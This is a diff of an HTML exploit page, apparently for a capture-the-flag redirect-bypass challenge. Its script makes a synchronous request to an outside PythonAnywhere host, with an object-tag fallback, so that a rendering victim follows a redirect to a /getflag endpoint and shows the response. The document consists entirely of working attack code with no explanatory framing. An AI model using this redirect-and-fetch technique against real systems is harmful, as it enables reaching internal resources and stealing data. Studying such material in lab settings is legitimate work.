@@ -1,8 +1,29 @@
+<!DOCTYPE html>
 <html>
 <body>
-    <h1>Exploit: Redirect Bypass</h1>
+    <h1>Attempting to Extract Flag...</h1>
+    <div id="result" style="border: 2px solid red; padding: 20px; font-size: 20px;">
+        Waiting for data...
+    </div>
+
+    <script>
+        try {
+            var x = new XMLHttpRequest();
+            // Point this to your PythonAnywhere redirect URL
+            // IMPORTANT: Use single slash /getflag
+            x.open("GET", "http://bigboy.pythonanywhere.com/getflag", false);
+            x.send();
+            
+            // Print the result to the page
+            document.getElementById("result").innerText = "SUCCESS:\n" + x.responseText;
+        } catch (e) {
+            document.getElementById("result").innerText = "ERROR:\n" + e.message;
+        }
+    </script>
+    
     <br>
-    <!-- Replace the URL below with your actual ngrok URL + /getflag -->
-    <iframe src="https://bigboy.pythonanywhere.com//getflag" width="1000" height="800"></iframe>
+    <h2>Fallback Object Method:</h2>
+    <!-- Trying object tag as a backup -->
+    <object data="http://bigboy.pythonanywhere.com/getflag" width="800" height="400"></object>
 </body>
 </html>
